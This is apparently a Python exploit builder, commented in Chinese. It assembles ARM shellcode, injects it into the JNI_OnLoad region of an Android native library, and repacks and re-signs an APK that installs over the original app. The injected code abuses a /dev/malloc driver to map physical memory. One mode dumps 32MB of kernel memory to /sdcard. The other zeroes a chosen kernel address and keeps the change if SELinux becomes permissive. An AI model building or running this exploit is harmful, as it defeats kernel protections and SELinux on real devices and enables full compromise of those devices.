#!/usr/bin/env python3
"""生成用于 /dev/malloc 的注入 so，并打包成可覆盖安装的签名 APK。

用法 (需设置 KEYSTORE_PASS，可选 JDK_BIN):
  python build_probe.py dump
  python build_probe.py write 2137bdfc

原理:
  - 以 libcredview-scan.so 为底，覆盖 .text 中 JNI_OnLoad(0x820..0xdd8) 区域
  - 汇编代码只用裸 syscall，不依赖 libc / 既有函数
  - 字符串用 movw/movt 写到栈上，避开 ASLR 与 literal-pool 限制
  - 替换 libhost-scan.apk 内的 lib/armeabi-v7a/librooterm1000.so，jarsigner v1 重签
"""
import sys, struct, zipfile, subprocess, os
from keystone import *

HERE = os.path.dirname(os.path.abspath(__file__))
BASE_SO   = os.path.join(HERE, 'libcredview-scan.so')
BASE_APK  = os.path.join(HERE, 'libhost-scan.apk')
KEYSTORE  = os.path.join(HERE, 'wbprobe.keystore')
JDK       = os.environ.get('JDK_BIN', '')
SO_IN_APK = 'lib/armeabi-v7a/librooterm1000.so'
TEXT_OFF  = 0x820
TEXT_END  = 0xdd8

STR_OFF = 64          # 栈上字符串起始偏移
STRINGS = {
    'dump':     STR_OFF,
    'malloc':   STR_OFF + 32,
    'enforce':  STR_OFF + 64,
    'hit':      STR_OFF + 96,
}
STACK_SIZE = 192


def str_setup(name, s):
    off = STRINGS[name]
    b = s.encode() + b'\0'
    b += b'\0' * ((4 - len(b) % 4) % 4)
    out = []
    for i in range(0, len(b), 4):
        w = int.from_bytes(b[i:i+4], 'little')
        out.append('movw r0, #%d' % (w & 0xffff))
        out.append('movt r0, #%d' % ((w >> 16) & 0xffff))
        out.append('str r0, [sp, #%d]' % (off + i))
    return out


def head(include_enforce=False, include_hit=False):
    L = []
    L += ['push {r4, r5, r6, r7, r8, r9, r10, r11, lr}']
    L += ['sub sp, sp, #%d' % STACK_SIZE]
    L += str_setup('dump', '/sdcard/wb_kcode.bin')
    L += str_setup('malloc', '/dev/malloc')
    if include_enforce:
        L += str_setup('enforce', '/sys/fs/selinux/enforce')
    if include_hit:
        L += str_setup('hit', '/sdcard/wb_hit.txt')
    return L


def open_file(path_off, flags, mode, dst):
    # 裸 syscall: r7=5(open), r0=path, r1=flags, r2=mode
    return ['add r0, sp, #%d' % path_off,
            'movw r1, #%d' % flags,
            'mov r2, #%d' % mode,
            'mov r7, #5', 'svc 0', 'mov %s, r0' % dst]


def tail():
    return ['mov r0, r10', 'mov r7, #6', 'svc 0',
            'movw r0, #6', 'movt r0, #1',
            'add sp, sp, #%d' % STACK_SIZE,
            'pop {r4, r5, r6, r7, r8, r9, r10, r11, pc}']


def asm_dump():
    """纯只读：把物理 0x20000000..0x22000000 (32MB) dump 到 /sdcard/wb_kcode.bin"""
    L = head()
    L += open_file(STRINGS['dump'], 0x241, 420, 'r10')
    L += open_file(STRINGS['malloc'], 2, 0, 'r11')
    L += ['mov r6, #0', 'movw r9, #0', 'movt r9, #0x0200']
    L += ['bus_loop:', 'cmp r6, r9', 'bhs done']
    # struct info @ sp
    L += ['mov r0, #0',
          'str r0, [sp, #4]', 'str r0, [sp, #12]', 'str r0, [sp, #16]',
          'str r0, [sp, #20]', 'str r0, [sp, #24]', 'str r0, [sp, #28]',
          'str r6, [sp, #0]',
          'mov r0, #0x1000000', 'str r0, [sp, #8]']
    L += ['mov r0, r11', 'movw r1, #0x4d04', 'movt r1, #0x8020',
          'mov r2, sp', 'mov r7, #54', 'svc 0']
    L += ['mov r0, #0', 'mov r1, #0x1000000', 'mov r2, #3', 'mov r3, #1',
          'mov r4, r11', 'mov r5, #0', 'mov r7, #192', 'svc 0']
    L += ['movw r1, #0xf000', 'movt r1, #0xffff', 'cmp r0, r1', 'bhs next_bus',
          'mov r5, r0', 'mov r8, #0']
    L += ['wloop:', 'mov r0, r10', 'add r1, r5, r8', 'mov r2, #0x10000',
          'mov r7, #4', 'svc 0', 'cmp r0, #0', 'ble wdone',
          'add r8, r8, r0', 'cmp r8, #0x1000000', 'blo wloop']
    L += ['wdone:', 'mov r0, r5', 'mov r1, #0x1000000', 'mov r7, #91', 'svc 0']
    L += ['next_bus:', 'add r6, r6, #0x1000000', 'b bus_loop']
    L += ['done:'] + tail()
    return '\n'.join(L)


def asm_write(target):
    """单地址试写：保存原值 -> 写 0 -> selinuxfs 验证 -> 未命中立即回滚。
       日志 /sdcard/wb_hit.txt 写 8 字节: [rc u32][target u32]
       rc=2 命中(保持 permissive), 1=open 成功但内容非 0, 0=仍被拒
    """
    page = target & ~0xfff
    off  = target & 0xfff
    addr = page - 0x20000000
    L = head(include_enforce=True, include_hit=True)
    L += open_file(STRINGS['hit'], 0x241, 420, 'r10')
    L += open_file(STRINGS['malloc'], 2, 0, 'r11')
    # struct info: addr = page - 0x20000000, size = 0x1000
    L += ['mov r0, #0',
          'str r0, [sp, #4]', 'str r0, [sp, #12]', 'str r0, [sp, #16]',
          'str r0, [sp, #20]', 'str r0, [sp, #24]', 'str r0, [sp, #28]']
    L += ['movw r0, #%d' % (addr & 0xffff), 'movt r0, #%d' % ((addr >> 16) & 0xffff),
          'str r0, [sp, #0]',
          'mov r0, #0x1000', 'str r0, [sp, #8]']
    L += ['mov r0, r11', 'movw r1, #0x4d04', 'movt r1, #0x8020',
          'mov r2, sp', 'mov r7, #54', 'svc 0']
    L += ['mov r0, #0', 'mov r1, #0x1000', 'mov r2, #3', 'mov r3, #1',
          'mov r4, r11', 'mov r5, #0', 'mov r7, #192', 'svc 0']
    L += ['movw r1, #0xf000', 'movt r1, #0xffff', 'cmp r0, r1',
          'bhs mapfail', 'mov r5, r0']
    # q = p + off ; r6 = q (off 可能不是合法 ARM 立即数, 用 movw 载入)
    L += ['movw r0, #%d' % off, 'add r6, r5, r0']
    L += ['ldr r8, [r6]',          # 保存原值
          'mov r0, #0', 'str r0, [r6]']
    # fd = open("/sys/fs/selinux/enforce", O_RDONLY)
    L += ['add r0, sp, #%d' % STRINGS['enforce'], 'mov r1, #0', 'mov r2, #0',
          'mov r7, #5', 'svc 0', 'mov r9, r0']
    L += ['mov r0, #0', 'str r0, [sp, #32]', 'str r0, [sp, #40]']  # rc=0, 读缓冲清零
    L += ['cmp r9, #0', 'blt no_open']
    L += ['mov r0, r9', 'add r1, sp, #40', 'mov r2, #1', 'mov r7, #3', 'svc 0',
          'mov r0, r9', 'mov r7, #6', 'svc 0']
    L += ['mov r0, #1', 'str r0, [sp, #32]']          # rc=1 (open 成功)
    L += ['ldrb r0, [sp, #40]', 'cmp r0, #0x30', 'bne no_open']
    L += ['mov r0, #2', 'str r0, [sp, #32]']          # rc=2 命中
    L += ['no_open:']
    L += ['ldr r0, [sp, #32]', 'cmp r0, #2', 'beq hit']
    L += ['str r8, [r6]']                             # 回滚
    L += ['hit:']
    # target 写到 sp+36
    L += ['movw r0, #%d' % (target & 0xffff), 'movt r0, #%d' % ((target >> 16) & 0xffff),
          'str r0, [sp, #36]']
    # write(lf, sp+32, 8)
    L += ['mov r0, r10', 'add r1, sp, #32', 'mov r2, #8', 'mov r7, #4', 'svc 0',
          'b finish']
    L += ['mapfail:', 'mvn r0, #0', 'str r0, [sp, #32]',
          'movw r0, #%d' % (target & 0xffff),
          'movt r0, #%d' % ((target >> 16) & 0xffff), 'str r0, [sp, #36]',
          'mov r0, r10', 'add r1, sp, #32', 'mov r2, #8', 'mov r7, #4', 'svc 0']
    L += ['finish:'] + tail()
    return '\n'.join(L)


def assemble(src):
    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
    enc, cnt = ks.asm(src, addr=TEXT_OFF)
    if enc is None:
        raise RuntimeError('keystone 汇编失败')
    data = bytes(enc)
    print('[asm] %d 条指令, %d 字节, 可用 %d 字节' % (cnt, len(data), TEXT_END - TEXT_OFF))
    if len(data) > TEXT_END - TEXT_OFF:
        raise RuntimeError('注入代码超出 .text 可用区')
    return data


def build_so(code):
    d = bytearray(open(BASE_SO, 'rb').read())
    d[TEXT_OFF:TEXT_OFF+len(code)] = code
    return bytes(d)


def build_apk(so, out_apk):
    zin = zipfile.ZipFile(BASE_APK, 'r')
    tmp = out_apk + '.unsigned'
    with zipfile.ZipFile(tmp, 'w', zipfile.ZIP_DEFLATED) as zout:
        for it in zin.infolist():
            n = it.filename
            if n.startswith('META-INF/'):
                continue
            data = so if n == SO_IN_APK else zin.read(n)
            zi = zipfile.ZipInfo(n, date_time=it.date_time)
            zi.compress_type = it.compress_type
            zi.external_attr = it.external_attr
            zout.writestr(zi, data)
    zin.close()
    jarsigner = os.path.join(JDK, 'jarsigner.exe') if JDK else 'jarsigner'
    cmd = [jarsigner,
           '-keystore', KEYSTORE,
           '-storepass', os.environ['KEYSTORE_PASS'],
           '-keypass', os.environ['KEYSTORE_PASS'],
           '-sigalg', 'SHA1withRSA', '-digestalg', 'SHA1',
           '-signedjar', out_apk, tmp, 'wb']
    r = subprocess.run(cmd, capture_output=True)
    print('[sign] rc=%d' % r.returncode,
          (r.stdout or b'').decode('utf-8', 'replace')[-160:],
          (r.stderr or b'').decode('utf-8', 'replace')[-160:])
    if r.returncode != 0:
        raise RuntimeError('jarsigner 失败')
    os.remove(tmp)
    print('[apk]', out_apk, os.path.getsize(out_apk), 'bytes')


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'dump'
    if mode == 'dump':
        src, tag = asm_dump(), 'dump'
    elif mode == 'write':
        t = int(sys.argv[2], 16)
        src, tag = asm_write(t), 'write-%08x' % t
    else:
        raise SystemExit('用法: build_probe.py dump | write <hexaddr>')
    code = assemble(src)
    so_path = os.path.join(HERE, 'wbinject-%s.so' % tag)
    open(so_path, 'wb').write(build_so(code))
    print('[so ]', so_path)
    build_apk(build_so(code), os.path.join(HERE, 'wbhost-%s.apk' % tag))


if __name__ == '__main__':
    main()
